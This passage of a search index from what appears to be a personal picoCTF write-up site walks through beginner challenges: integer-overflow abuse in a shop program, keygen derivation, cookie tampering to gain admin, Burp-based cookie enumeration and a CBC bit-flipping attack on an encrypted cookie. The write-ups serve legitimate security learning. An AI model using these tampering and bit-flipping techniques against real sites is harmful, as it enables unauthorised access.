time trying to solve it, go ahead. Otherwise, consider checking out an online write-up. 1 A decent writeup of 1_wanna_b3_a_r0ck5star can be found here: https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/1_wanna_b3_a_r0ck5tar.md \u21a9","title":"General Skills"},{"location":"ctf/pico-general.html#general-skills","text":"","title":"General Skills"},{"location":"ctf/pico-general.html#obedient-cat","text":"This is basically a \"test challenge\" to ensure you know how things work. You download the file, read it in a text editor (or just via cat ), and you can recover the flag for submission. $ cat flag picoCTF { redacted_value }","title":"Obedient Cat"},{"location":"ctf/pico-general.html#python-wrangling","text":"This is a \"can you run python and follow instructions\" challenge. You start with a script ende.py that can encrypt/decrypt a file ( flag.txt.en ) using the password in pw.txt . You can do this in two steps, or in a one-liner as follows: python3 ende.py -d flag.txt.en < pw.txt Please enter the password:picoCTF { redacted_value }","title":"Python Wrangling"},{"location":"ctf/pico-general.html#wave-a-flag","text":"This is a simple test to see if you know how to interact with command-line tools by asking for arguments. Additionally, you need to know a little about execute permissions. # make it executable $ chmod +x warm # run it to see what it does $ ./warm Hello user! Pass me a -h to learn what I can do ! # follow the instructions $ ./warm -h Oh, help? I actually don ' t do much, but I do have this flag here: picoCTF { redacted_value }","title":"Wave a flag"},{"location":"ctf/pico-general.html#nice-netcat","text":"We are pointed to $ nc mercury.picoctf.net 22902 but told that the program doesn't speak English. Looking at the response, it looks like ascii, so let's dump the data and see if we can do something # get the data and store it in a file called data $ nc mercury.picoctf.net 22902 > data # loop through the file, convert each line to ascii and print it out $ while read ln ; do printf \"\\x $( printf %x $ln ) \" ; done < data picoCTF { redacted_value }","title":"Nice netcat..."},{"location":"ctf/pico-general.html#static-aint-always-noise","text":"For this challenge you are provided two files, static and a potentially helpful bash script, ltdis.sh The ltdis.sh script seems like a bit of a sledge hammer... I simply ran strings, grepped for 'pico' and found the flag. $ strings static | grep pico picoCTF { redacted_value }","title":"Static ain't always noise"},{"location":"ctf/pico-general.html#tab-tab-attack","text":"The description for this challenge suggests something about tabcomplete and rambling directory structures and filenames. Provided is a zip file, Addadshashanammu.zip . Finding the key is pretty easy: # unzip the file $ unzip Addadshashanammu.zip # cat the deepest-extracted file (looked interesting) $ cat Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet # clear that it is a binary but there is a string version of the flag # let's get it $ strings Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet | grep pico *ZAP!* picoCTF { redacted_value }","title":"Tab, Tab, Attack"},{"location":"ctf/pico-general.html#magikarp-ground-mission","text":"This is just a simple challenge to confirm you know how to ssh, how to navigate around and read files. Once in, cat 1of3.flag.txt , read the instructions file and cat /2of3.flag.txt . Read the instructions file and then cat ~/3of3.flag.txt . Assemble the results and go.","title":"Magikarp Ground Mission"},{"location":"ctf/pico-general.html#lets-warm-up","text":"A simple test to see if you can convert between hex and ASCII characters. # simple lookup table $ man ascii Warning I don't like the instructions for this challenge, because you are expected to calculate the result (easy enough), but then you have to assume how to format the flag (normal format, picoCTF{<value>} ). It's not hard, but the ambiguity isn't helpful.","title":"Lets Warm Up"},{"location":"ctf/pico-general.html#warmed-up","text":"Just need to convert a hex value to decimal $ python -c print ( int ( 0x3D )) 61","title":"Warmed Up"},{"location":"ctf/pico-general.html#2warm","text":"Here we convert a decimal number to a binary string $ python -c 'print(format(42, \"b\"))' 101010","title":"2Warm"},{"location":"ctf/pico-general.html#whats-a-net-cat","text":"This is another introduction to netcat. $ nc jupiter.challenges.picoctf.org 41120 You ' re on your way to becoming the net cat master picoCTF { redacted_value }","title":"what's a net cat?"},{"location":"ctf/pico-general.html#strings-it","text":"This is getting old now... donwload the file, run strings, submit flag. $ strings strings | grep pico picoCTF { redacted_value }","title":"strings it"},{"location":"ctf/pico-general.html#bases","text":"This looks like a base64 conversion question. $ echo \"bDNhcm5fdGgzX3IwcDM1\" | base64 -d redacted_value","title":"Bases"},{"location":"ctf/pico-general.html#first-grep","text":"Another simple test to see if you can grep # option 1 $ cat file | grep pico picoCTF { redacted_value } # option 2 $ grep \"pico\" file picoCTF { redacted_value }","title":"First Grep"},{"location":"ctf/pico-general.html#codebook","text":"","title":"Codebook"},{"location":"ctf/pico-general.html#convertmepy","text":"","title":"convertme.py"},{"location":"ctf/pico-general.html#fixme1py","text":"","title":"fixme1.py"},{"location":"ctf/pico-general.html#fixme2py","text":"","title":"fixme2.py"},{"location":"ctf/pico-general.html#glitch-cat","text":"","title":"Glitch Cat"},{"location":"ctf/pico-general.html#hashingjobapp","text":"","title":"HashingJobApp"},{"location":"ctf/pico-general.html#pw-crack-1","text":"","title":"PW Crack 1"},{"location":"ctf/pico-general.html#pw-crack-2","text":"","title":"PW Crack 2"},{"location":"ctf/pico-general.html#pw-crack-3","text":"","title":"PW Crack 3"},{"location":"ctf/pico-general.html#pw-crack-4","text":"","title":"PW Crack 4"},{"location":"ctf/pico-general.html#pw-crack-5","text":"","title":"PW Crack 5"},{"location":"ctf/pico-general.html#runmepy","text":"","title":"runme.py"},{"location":"ctf/pico-general.html#serpentine","text":"","title":"Serpentine"},{"location":"ctf/pico-general.html#first-find","text":"","title":"First Find"},{"location":"ctf/pico-general.html#big-zip","text":"","title":"Big Zip"},{"location":"ctf/pico-general.html#based","text":"This is another data encoding challenge. You are given a string of bits (binary) that you need to translate quickly, in this case, within 45 seconds. There are probably a handful of ways to solve this, including a script. Instead, I ended up using the online CyberChef tool to help out. I was presented a binary string that I translated using the From Binary , followed by an octal string for which I used thed from Octal tool, and finally a hexadecimal string where I used the from Hex tool. The easiest way to set up CyberChef for this would be to have three different input tabs, have the appropriate recipies enabled/disabled for each tab, so it is just a matter of copy/paste. Actually , my first solution bothered me as I didn't think it was scalable and wouldn't really help me in the long term. I went back and re-solved it using a Python-based interactive netcat client. The script is available in the assets section.","title":"Based"},{"location":"ctf/pico-general.html#plumbing","text":"This one was a bit too easy for 200 points. You connect via nc to a server and are given a bunch of text. Based on what we've seen earlier, it is pretty easy to script/find the flag. $ nc jupiter.challenges.picoctf.org 4427 | grep pico picoCTF { redacted_value }","title":"plumbing"},{"location":"ctf/pico-general.html#mus1c","text":"This one was a bit strange, and as I comment below, a bit of a disapointment. The \"trick\" you need to figure out is that it is actually a program, written in a esoteric programming language called RockStar . If you take the lyrics provided and dump them into the online interpreter , you get a series of values that look quite like ASCII. If you convert those values into ASCII characters (either via a script or online tool such as CyberChef), you'll get the value you can then plug into the flag format for submission. Tip For some dumb reason, I was having trouble figuring out how to convince CyberChef to give me characters from ASCII codes. Come to find out, I was using the wrong recipie. Using the From Decimal tool is all that is needed, and you can change the delimiter to various things such as Line feed which was helpful in this case. Failure I really do not like this type of challenge and am a bit disappointed that it is included in picoCTF. For all of the other challenges, there is a clear pedagogical rationale that maps to building strong cyber security skills. This is simply searching the Internet for a weird phrase from some provided text, assuming you will guess the linking, and plugging some things together.","title":"mus1c"},{"location":"ctf/pico-general.html#flag_shop","text":"This is a simple test to see if you can read source code and if you understand the issues with int roll-overs. You are provided the source code store.c and told to connect to a server via netcat. The keys to this challenge are as follows: Understand the starting balance of 1100 Notice that buying the \"real\" flag costs 100000 Notice that you can buy a number of \"fake\" flags at 900 each. Somehow, we need to get our balance up from 1100 to over 100000 This process of buying fake flags is the only place (other than purchings the real flags) that your account balance is updated. If you try to purchase a stupidly-large number of flags (e.g. 2,500,000), the calculated cost will actually be negative (due to integer rollover). This then subtracts a large negative value from your current balance, effectively adding to it, making you a rich person you can then purchase the flag with ease Hint The key take-away here is that multiplying two int values ( signed ), can easily result in a value larger than INT_MAX . If this is unchecked, it will overflow, resulting in a negative number as the result. I initially did the math to get my purchase number with a calculator, but I then went back and wrote a little program to calculate the optimal value just for learning purposes: #include <stdio.h> #include <stdlib.h> int main () { // these both are signed! int account_balance = 0 ; int number_flags = 0 ; int total_cost = 0 ; do { account_balance = 1100 ; number_flags ++ ; total_cost = 900 * number_flags ; if ( total_cost <= account_balance ) { account_balance = account_balance - total_cost ; } } while ( account_balance < 10000 ); printf ( \" \\n When the number of fake flags ordered is %d \\n \" , number_flags ); printf ( \"The resulting cost is %d \\n \" , total_cost ); printf ( \"And your account balance will be %d \\n \" , account_balance ); } And if we build/run it... $ gcc -g -o mytest mytest.c $ ./mytest When the number of fake flags ordered is 2386095 The resulting cost is -2147481796 And your account balance will be 2147482896","title":"flag_shop"},{"location":"ctf/pico-general.html#1_wanna_b3_a_r0ck5star","text":"Again with the waste-of-time challenges. If you want to waste your time trying to solve it, go ahead. Otherwise, consider checking out an online write-up. 1 A decent writeup of 1_wanna_b3_a_r0ck5star can be found here: https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/1_wanna_b3_a_r0ck5tar.md \u21a9","title":"1_wanna_b3_a_r0ck5star"},{"location":"ctf/pico-re.html","text":"Reverse Engineering \u00b6 Transformation \u00b6 This one takes a little more work than some of the other starter challenges. You are given a file enc and a little bit of code: ''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) and asked to figure out what it is. To solve this you likely need to understand what the \"code\" is doing and what each command is. This appears to be a python one-liner that takes a variable flag , loops through it, manipulates it a bit, and spits it out. To get the flag back in 'plain text', we simply need to reverse the process. What appears to be happening in the provided python script is this: loop through the characters in flag , starting with the \"0 th \", and skipping every other take the ordinal value of the current character (int that maps to the ASCII code, e.g. 'a' becomes 97) and shift that value up by 8. then take the next character in the flag and add it to the shifted value output the resulting number as a string character. To \"undo\" the above, we need to: loop through the characters in enc one at a time take the ordinal value of the current character take the right-most 8 bits and convert that to a character (becomes the second letter) shift the remaining number down 8, convert that to a character output the results A \"verbose\" version of the reversing is shown in the following python function: def decode ( enc ): result = '' for i in range ( 0 , len ( enc )): result += chr ( ord ( enc [ i ]) >> 8 ) result += chr ( ord ( enc [ i ]) & 0xff ) return result A \"one liner\" is as follows: '' . join ([ chr ( ord ( enc [ i ]) >> 8 ) + chr ( ord ( enc [ i ]) & 0xff ) for i in range ( 0 , len ( enc ))]) So, you can tie it all together if you like as follows: $ cat enc | python3 -c \"import sys; enc=sys.stdin.read(); plain=''.join([chr(ord(enc[i]) >> 8) + chr(ord(enc[i]) & 0xff) for i in range(0, len(enc))]); print(plain)\" picoCTF { redacted_value } keygenme-py \u00b6 For this challenge, you are given the file keygenme-trial.py and no further instructions. If we run the script, we see that there is some functionality that is protected by a license key. It doesn't take much guessing to assume we need to figure out the key, the result of which will either be the flag itself, or will unlock functionality that will render it. Looking into the code we see the function check_key(user_key, bUsername_trial) that looks quite promising. Digging into it and the surrounding code, we learn the following things: Must be 32 chars long Starts with picoCTF{1n_7h3_|<3y_of_ Ends with } Has 8 unknown chars in the middle xxxxxxxx username_trial is GOUGH Additionally, the main logic of the check_key() function is as follows: Confirm provided key is 32 chars long Ensure the first part of the key matches picoCTF{1n_7h3_|<3y_of_ Loops through the next 8 characters to ensure they match particular indicies of a hash based on the trial username If everything else has passed, we are good to go. All of the hash-based checks look at the same hash, simply compare against different indicies. So, let's do a one-liner to generate our own copy of the hash so we can work against it. $ python3 -c \"import hashlib; x=hashlib.sha256(b'GOUGH').hexdigest(); print(x)\" e8a1f9146d32473b9605568ca66f7b5c2db9f271f57a8c8e9e121e48accddf2f Simple enough, we then build our 8-digit key using the proper values from the string above (remember the indicies in the code are zero-based). f911a486 We then assemble the entire key and submit it to the app to decrypt the \"full\" version of the program. crackme-py \u00b6 This one is pretty easy. Downloading/running the file didn't seem to do much, so we view it in an editor and notice an uncalled-function decode_secret() as well as an interesting constant bezos_cc_secret . We add a line at the bottom of the script decode_secret(bezos_cc_secret) and then run the script, providing some dummy values, and then being presented with a key. ARMssembly 0 \u00b6 Here we are presented a file ( chall.S ) which is an ARM-based assembly program. We then are asked \"What integer does this program print with arguments 182476535 and 3742084308 ? Flag format: picoCTF{XXXXXXXX} -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})\"","title":"Reverse Engineering"},{"location":"ctf/pico-re.html#reverse-engineering","text":"","title":"Reverse Engineering"},{"location":"ctf/pico-re.html#transformation","text":"This one takes a little more work than some of the other starter challenges. You are given a file enc and a little bit of code: ''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) and asked to figure out what it is. To solve this you likely need to understand what the \"code\" is doing and what each command is. This appears to be a python one-liner that takes a variable flag , loops through it, manipulates it a bit, and spits it out. To get the flag back in 'plain text', we simply need to reverse the process. What appears to be happening in the provided python script is this: loop through the characters in flag , starting with the \"0 th \", and skipping every other take the ordinal value of the current character (int that maps to the ASCII code, e.g. 'a' becomes 97) and shift that value up by 8. then take the next character in the flag and add it to the shifted value output the resulting number as a string character. To \"undo\" the above, we need to: loop through the characters in enc one at a time take the ordinal value of the current character take the right-most 8 bits and convert that to a character (becomes the second letter) shift the remaining number down 8, convert that to a character output the results A \"verbose\" version of the reversing is shown in the following python function: def decode ( enc ): result = '' for i in range ( 0 , len ( enc )): result += chr ( ord ( enc [ i ]) >> 8 ) result += chr ( ord ( enc [ i ]) & 0xff ) return result A \"one liner\" is as follows: '' . join ([ chr ( ord ( enc [ i ]) >> 8 ) + chr ( ord ( enc [ i ]) & 0xff ) for i in range ( 0 , len ( enc ))]) So, you can tie it all together if you like as follows: $ cat enc | python3 -c \"import sys; enc=sys.stdin.read(); plain=''.join([chr(ord(enc[i]) >> 8) + chr(ord(enc[i]) & 0xff) for i in range(0, len(enc))]); print(plain)\" picoCTF { redacted_value }","title":"Transformation"},{"location":"ctf/pico-re.html#keygenme-py","text":"For this challenge, you are given the file keygenme-trial.py and no further instructions. If we run the script, we see that there is some functionality that is protected by a license key. It doesn't take much guessing to assume we need to figure out the key, the result of which will either be the flag itself, or will unlock functionality that will render it. Looking into the code we see the function check_key(user_key, bUsername_trial) that looks quite promising. Digging into it and the surrounding code, we learn the following things: Must be 32 chars long Starts with picoCTF{1n_7h3_|<3y_of_ Ends with } Has 8 unknown chars in the middle xxxxxxxx username_trial is GOUGH Additionally, the main logic of the check_key() function is as follows: Confirm provided key is 32 chars long Ensure the first part of the key matches picoCTF{1n_7h3_|<3y_of_ Loops through the next 8 characters to ensure they match particular indicies of a hash based on the trial username If everything else has passed, we are good to go. All of the hash-based checks look at the same hash, simply compare against different indicies. So, let's do a one-liner to generate our own copy of the hash so we can work against it. $ python3 -c \"import hashlib; x=hashlib.sha256(b'GOUGH').hexdigest(); print(x)\" e8a1f9146d32473b9605568ca66f7b5c2db9f271f57a8c8e9e121e48accddf2f Simple enough, we then build our 8-digit key using the proper values from the string above (remember the indicies in the code are zero-based). f911a486 We then assemble the entire key and submit it to the app to decrypt the \"full\" version of the program.","title":"keygenme-py"},{"location":"ctf/pico-re.html#crackme-py","text":"This one is pretty easy. Downloading/running the file didn't seem to do much, so we view it in an editor and notice an uncalled-function decode_secret() as well as an interesting constant bezos_cc_secret . We add a line at the bottom of the script decode_secret(bezos_cc_secret) and then run the script, providing some dummy values, and then being presented with a key.","title":"crackme-py"},{"location":"ctf/pico-re.html#armssembly-0","text":"Here we are presented a file ( chall.S ) which is an ARM-based assembly program. We then are asked \"What integer does this program print with arguments 182476535 and 3742084308 ? Flag format: picoCTF{XXXXXXXX} -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})\"","title":"ARMssembly 0"},{"location":"ctf/pico-webex.html","text":"Web Exploitation \u00b6 GET aHEAD \u00b6 This probably goes down as one of those \"boy, did you make it harder than it should have been\" activities. You are asked to find the flag hidden at http://mercury.picoctf.net:47967 . After a bit of benign poking around, I assumed that you need to use burp (or similar) to modify the requests, so I fired it up and started looking around. I had expected to find something in the headers taht would give the answer, but no joy. After fighting with this for too long, I broke down and looked at the first hint, which said something like \"maybe you have more than two choices\" . Score one for my lack of creativity. Looking at the page code again, I noticed that one option submitted a GET request and the other did a POST request. Great! All I need to do is loop through the valid HTTP verbs, and I'll be set. So, I captured a request in burp, sent it to the Repeater tool, modified the verb, and sent it... did it again for each verb ( GET , PUT , POST , PATCH , DELETE ) and, as you might guess... no joy. My creative thinking fails again. Finally, I tried HEAD (a guess, based on the title of the challenge) and, wouldn't you guess... bingo. I then stepped back to curl to see if I could have done it there, and ended up with this one-liner: # -I (or --head) fetches the HTTP headers only. --> this is the same as sending a HEAD verb $ curl http://mercury.picoctf.net:47967 -I HTTP/1.1 200 OK flag: picoCTF { redacted_value } Content-type: text/html ; charset = UTF-8 Cookies \u00b6 Need to try to figure out the \"best\" cookie from http://mercury.picoctf.net:27177 So, the purpose of this challenge is really to ensure you know how to use Burp Suite's Intruder tool, or something similar. After poking around a bit with valid cookie names, you will notice that upon finding a valid cookie, the user is directed to http://mercury.picoctf.net:27177/check with a cookie value of name=,some_int> . The value of <some_int> changes based on the cookie name, and appears to be a lookup value of some sort. If you configure Intruder to use a sequential numerical payload that goes from say, 1 to 50 in steps of 1 and then run the attack, you'll see that the length property of the response for 18 is different than the rest. Inspecting the returned html will show you the key. Hint A helpful link found while working on this challenge is https://github.com/swisskyrepo/PayloadsAllTheThings which provides word lists and various payloads for different situations Insp3ct0r \u00b6 We are encouraged to inspect the following URL: https://jupiter.challenges.picoctf.org/problem/9670/ Upon viewing the source, we quickly see \u2153rd of the key in the comment string at the bottom: picoCTF{tru3_d3 ... now to find the remaining \u2154rds. Poking around at the downloaded JS file myjs.js , we see the end of the flag: _lucky?2e7b23e3} . All we are missing now is the middle part... Thinking ever so little, we assume that we can go to the only other referenced file ( mycss.css ) and find the middle part of the key, which we do: t3ct1ve_0r_ju5t Note for what it is worth, I found this to be a very easy \"challenge\", and more on the lines of a 10 point challenge than the two prior ones... Scavenger Hunt \u00b6 We are asked to find the interesting information hidden here: http://mercury.picoctf.net:39491/ looking at the page source, we find picoCTF{t looking at the css source we find h4ts_4_l0 looking at the JS source, we find a hint... /* How can I keep Google from indexing my website? */ which points us to robots.txt looking at robots.txt , we find t_0f_pl4c as well as a hint that this is an apache server looking at .htaccess (clearly a mis-configured apache server), we find 3s_2_lO0k . We also see that this was built on a mac and that we can store alot of info there. looking at .DS_Store , we find the last portion: _f7ce8828} Some Assembly Required 1 \u00b6 No description provided, no hints provided, just this url: http://mercury.picoctf.net:26318/index.html . Once you get there, you have a form that says \"enter flag\" with a submit button. After noodling around a little, this challenge looks like an introduction to Web Assembly As I normally do, I spent way too much time trying to unravel the JS code here (mild obfuscation) only to realize that I was missing the really obvious piece... the following is the magic line: let _0x5f0229 = await fetch ( _0x48c3be ( 489 )), In order to understand what is going on (and get the flag), you need to know the following: * _0x48c3be is a function pointer, declared two lines prior, that points to the function defined on line 28 of the de-mangled javascript ( const _0x4e0e = function (_0x553839, _0x53c021) { ). * you then need to know how the _0x4e0e() function works. * It essentially takes in a number, subtracts 470 from it, and then uses the result as an index into the _0x402c array defined at the top of the file. * Before you get too excited, however, you need to understand that the immediately-executing function defined prior to the current code block (line 33 for me, which starts liek (function (_0x76dd13, _0x3dfcae) { ) modifies/sorts the array into a different order. Without this knowledge, your indicies will point to the wrong place. * Having done all of that, you can determine that fetch() call referenced above is grabbing a pre-compiled blob of web assembly code. If you download that file ( http://mercury.picoctf.net:26318/JIFxzHyW8W ) and run strings on it, you will see the flag you can submit. Tip A few things that were helpful for me as I worked through this one: * Using jsbin to execute random JavaScript was quite helpful * Figuring out that when FireFox's dev tools \"demangled\" the javascript, it left the two words await fetch() slammed together as awaitfetch() . The latter is not a function that you will find, and searching for it will leave you disappointed. Adding the space in between them and then trying to understand the code will place you in a much better position. More Cookies \u00b6 Instructions suggest that there exists \"encrypted\" cookies that must be modified client-side in order to solve the challenge. Pointer to url: http://mercury.picoctf.net:15614/ . Visiting the page shows nothing other than a \"reset\" link and a comment that only the admin can use the cookie search page. After poking around a little in Firefox and seeing the cookie (text below), I decided to open up Burp and start there. Cookie: name=7; auth_name=dEJSZTVtTlZOajVGSWc0WFBRckZzWmtiMi8vNWJkUzQ2MURNLzYySUlXS1BlZXFUK1BqaHk3MGlwTm96ampFTU1qUitXT2s1cXZUWUUrbS9GeXJHZzN0bTltdDBjL21YNXJWSy83YjF6SFR0ektWNWVWVmpwSnErMDFQYW9mVW4= After decoding the base64 version of auth_name , we were left with this: tBRe5mNVNj5FIg4XPQrFsZkb2//5bdS461DM/62IIWKPeeqT+Pjhy70ipNozjjEMMjR+WOk5qvTYE+m/FyrGg3tm9mt0c/mX5rVK/7b1zHTtzKV5eVVjpJq+01PaofUn FSly8XvmFjLPdS83KXonEoEDE4cmhz8QwWCiNnsmdS0FrZmIouQghyQcnmOayk2fJ9LNM25QxcQF69MuYoAdXJWd206be16+q39R76T3GOmW7CxUBCl7wtm7W1HmZtPA Which wasn't too helpful. I decided to click on the first hint, and was pointed to a wikipedia page on homomorphic encryption After reading this article and deciding that it was unhelpful, I clicked on the second hint that basically said, even if you were to crack it, you likely won't be helped out. ( I missed the point here ). I noodled around with the challenge for a bit longer, and eventually decided that this was one of those \"I need to learn\" so I started googling for a write-up. I quickly found one that confirmed that I likely would not have found the solution because I wasn't thinking creatively enough and also wasn't noticing sufficient details. The hint about homomorphic encryption should be pointing me to the fact that I might have been able to make some changes to the encrypted text (cipher text) and cause some effect. The second hint in this direction was completely lost on me, in that the challenge description said the following: I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! You'll note that I highlighted the three oddly-capitalized letters, forming CBC which (after reading a bit) should have triggered me into considering a bit-flipping attack (e.g. admin=0 vs admin=1 ) due to the way cipher-block chaining works. I learned a bit about how to do this in Python3 and developed a script, only to have it not work. I did some additional reading and found that in the most recent version of the challenge (at least as of 2021), the cookie value was double base64 encoded. I needed to double-decode, bit flip, and then double-encode. With this in place, it \"sovled\" the problem on the 10 th byte in, flipping the 0 th bit. Helpful Writeups: https://docs.abbasmj.com/ctf-writeups/picoctf2021#more-cookies (don't take this verbatim) https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/More%20Cookies/script.py where are the robots \u00b6 After the last one that took me quite a long time to solve, this one was nearly a joke. The title suggests that mabye it is a robots.txt problem. Visiting the URL and then adjusting it for robots.txt renders a page that is prohibited ( 1bb4c.html ). If you point your browser there, you will be presented the flag. logon \u00b6 This one was, once again, pretty easy. You follow the instructions given and log in as jason (no password). Nothing is obvious other than no flag being shown. If, however, you inspect the cookies, you'll see a parameter that says admin=False . If you alter this to say admin=True and resend the request, you'll be rewarded with the flag to submit. dont-use-client-side \u00b6 It is my Birthday \u00b6 Who are you? \u00b6 login \u00b6 Some Assembly Required 2 \u00b6 Super Serial \u00b6 Most Cookies \u00b6 caas \u00b6 Some Assembly Required 3 \u00b6 Web Gauntlet 2 \u00b6 picobrowser \u00b6 Client-side-again \u00b6 Web Gauntlet \u00b6 Some Assembly Required 4 \u00b6 X marks the spot \u00b6 notepad \u00b6 Irish-Name-Repo 1 \u00b6 Web Gauntlet 3 \u00b6 JAuth \u00b6 Irish-Name-Repo 2 \u00b6 Irish-Name-Repo 3 \u00b6 JaWT Scratchpad \u00b6 Java Script Kiddie \u00b6 Java Script Kiddie 2 \u00b6 Bithug \u00b6","title":"Web Exploitation"},{"location":"ctf/pico-webex.html#web-exploitation","text":"","title":"Web Exploitation"},{"location":"ctf/pico-webex.html#get-ahead","text":"This probably goes down as one of those \"boy, did you make it harder than it should have been\" activities. You are asked to find the flag hidden at http://mercury.picoctf.net:47967 . After a bit of benign poking around, I assumed that you need to use burp (or similar) to modify the requests, so I fired it up and started looking around. I had expected to find something in the headers taht would give the answer, but no joy. After fighting with this for too long, I broke down and looked at the first hint, which said something like \"maybe you have more than two choices\" . Score one for my lack of creativity. Looking at the page code again, I noticed that one option submitted a GET request and the other did a POST request. Great! All I need to do is loop through the valid HTTP verbs, and I'll be set. So, I captured a request in burp, sent it to the Repeater tool, modified the verb, and sent it... did it again for each verb ( GET , PUT , POST , PATCH , DELETE ) and, as you might guess... no joy. My creative thinking fails again. Finally, I tried HEAD (a guess, based on the title of the challenge) and, wouldn't you guess... bingo. I then stepped back to curl to see if I could have done it there, and ended up with this one-liner: # -I (or --head) fetches the HTTP headers only. --> this is the same as sending a HEAD verb $ curl http://mercury.picoctf.net:47967 -I HTTP/1.1 200 OK flag: picoCTF { redacted_value } Content-type: text/html ; charset = UTF-8","title":"GET aHEAD"},{"location":"ctf/pico-webex.html#cookies","text":"Need to try to figure out the \"best\" cookie from http://mercury.picoctf.net:27177 So, the purpose of this challenge is really to ensure you know how to use Burp Suite's Intruder tool, or something similar. After poking around a bit with valid cookie names, you will notice that upon finding a valid cookie, the user is directed to http://mercury.picoctf.net:27177/check with a cookie value of name=,some_int> . The value of <some_int> changes based on the cookie name, and appears to be a lookup value of some sort. If you configure Intruder to use a sequential numerical payload that goes from say, 1 to 50 in steps of 1 and then run the attack, you'll see that the length property of the response for 18 is different than the rest. Inspecting the returned html will show you the key. Hint A helpful link found while working on this challenge is https://github.com/swisskyrepo/PayloadsAllTheThings which provides word lists and various payloads for different situations","title":"Cookies"},{"location":"ctf/pico-webex.html#insp3ct0r","text":"We are encouraged to inspect the following URL: https://jupiter.challenges.picoctf.org/problem/9670/ Upon viewing the source, we quickly see \u2153rd of the key in the comment string at the bottom: picoCTF{tru3_d3 ... now to find the remaining \u2154rds. Poking around at the downloaded JS file myjs.js , we see the end of the flag: _lucky?2e7b23e3} . All we are missing now is the middle part... Thinking ever so little, we assume that we can go to the only other referenced file ( mycss.css ) and find the middle part of the key, which we do: t3ct1ve_0r_ju5t Note for what it is worth, I found this to be a very easy \"challenge\", and more on the lines of a 10 point challenge than the two prior ones...","title":"Insp3ct0r"},{"location":"ctf/pico-webex.html#scavenger-hunt","text":"We are asked to find the interesting information hidden here: http://mercury.picoctf.net:39491/ looking at the page source, we find picoCTF{t looking at the css source we find h4ts_4_l0 looking at the JS source, we find a hint... /* How can I keep Google from indexing my website? */ which points us to robots.txt looking at robots.txt , we find t_0f_pl4c as well as a hint that this is an apache server looking at .htaccess (clearly a mis-configured apache server), we find 3s_2_lO0k . We also see that this was built on a mac and that we can store alot of info there. looking at .DS_Store , we find the last portion: _f7ce8828}","title":"Scavenger Hunt"},{"location":"ctf/pico-webex.html#some-assembly-required-1","text":"No description provided, no hints provided, just this url: http://mercury.picoctf.net:26318/index.html . Once you get there, you have a form that says \"enter flag\" with a submit button. After noodling around a little, this challenge looks like an introduction to Web Assembly As I normally do, I spent way too much time trying to unravel the JS code here (mild obfuscation) only to realize that I was missing the really obvious piece... the following is the magic line: let _0x5f0229 = await fetch ( _0x48c3be ( 489 )), In order to understand what is going on (and get the flag), you need to know the following: * _0x48c3be is a function pointer, declared two lines prior, that points to the function defined on line 28 of the de-mangled javascript ( const _0x4e0e = function (_0x553839, _0x53c021) { ). * you then need to know how the _0x4e0e() function works. * It essentially takes in a number, subtracts 470 from it, and then uses the result as an index into the _0x402c array defined at the top of the file. * Before you get too excited, however, you need to understand that the immediately-executing function defined prior to the current code block (line 33 for me, which starts liek (function (_0x76dd13, _0x3dfcae) { ) modifies/sorts the array into a different order. Without this knowledge, your indicies will point to the wrong place. * Having done all of that, you can determine that fetch() call referenced above is grabbing a pre-compiled blob of web assembly code. If you download that file ( http://mercury.picoctf.net:26318/JIFxzHyW8W ) and run strings on it, you will see the flag you can submit. Tip A few things that were helpful for me as I worked through this one: * Using jsbin to execute random JavaScript was quite helpful * Figuring out that when FireFox's dev tools \"demangled\" the javascript, it left the two words await fetch() slammed together as awaitfetch() . The latter is not a function that you will find, and searching for it will leave you disappointed. Adding the space in between them and then trying to understand the code will place you in a much better position.","title":"Some Assembly Required 1"},{"location":"ctf/pico-webex.html#more-cookies","text":"Instructions suggest that there exists \"encrypted\" cookies that must be modified client-side in order to solve the challenge. Pointer to url: http://mercury.picoctf.net:15614/ . Visiting the page shows nothing other than a \"reset\" link and a comment that only the admin can use the cookie search page. After poking around a little in Firefox and seeing the cookie (text below), I decided to open up Burp and start there. Cookie: name=7; auth_name=dEJSZTVtTlZOajVGSWc0WFBRckZzWmtiMi8vNWJkUzQ2MURNLzYySUlXS1BlZXFUK1BqaHk3MGlwTm96ampFTU1qUitXT2s1cXZUWUUrbS9GeXJHZzN0bTltdDBjL21YNXJWSy83YjF6SFR0ektWNWVWVmpwSnErMDFQYW9mVW4= After decoding the base64 version of auth_name , we were left with this: tBRe5mNVNj5FIg4XPQrFsZkb2//5bdS461DM/62IIWKPeeqT+Pjhy70ipNozjjEMMjR+WOk5qvTYE+m/FyrGg3tm9mt0c/mX5rVK/7b1zHTtzKV5eVVjpJq+01PaofUn FSly8XvmFjLPdS83KXonEoEDE4cmhz8QwWCiNnsmdS0FrZmIouQghyQcnmOayk2fJ9LNM25QxcQF69MuYoAdXJWd206be16+q39R76T3GOmW7CxUBCl7wtm7W1HmZtPA Which wasn't too helpful. I decided to click on the first hint, and was pointed to a wikipedia page on homomorphic encryption After reading this article and deciding that it was unhelpful, I clicked on the second hint that basically said, even if you were to crack it, you likely won't be helped out. ( I missed the point here ). I noodled around with the challenge for a bit longer, and eventually decided that this was one of those \"I need to learn\" so I started googling for a write-up. I quickly found one that confirmed that I likely would not have found the solution because I wasn't thinking creatively enough and also wasn't noticing sufficient details. The hint about homomorphic encryption should be pointing me to the fact that I might have been able to make some changes to the encrypted text (cipher text) and cause some effect. The second hint in this direction was completely lost on me, in that the challenge description said the following: I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! You'll note that I highlighted the three oddly-capitalized letters, forming CBC which (after reading a bit) should have triggered me into considering a bit-flipping attack (e.g. admin=0 vs admin=1 ) due to the way cipher-block chaining works. I learned a bit about how to do this in Python3 and developed a script, only to have it not work. I did some additional reading and found that in the most recent version of the 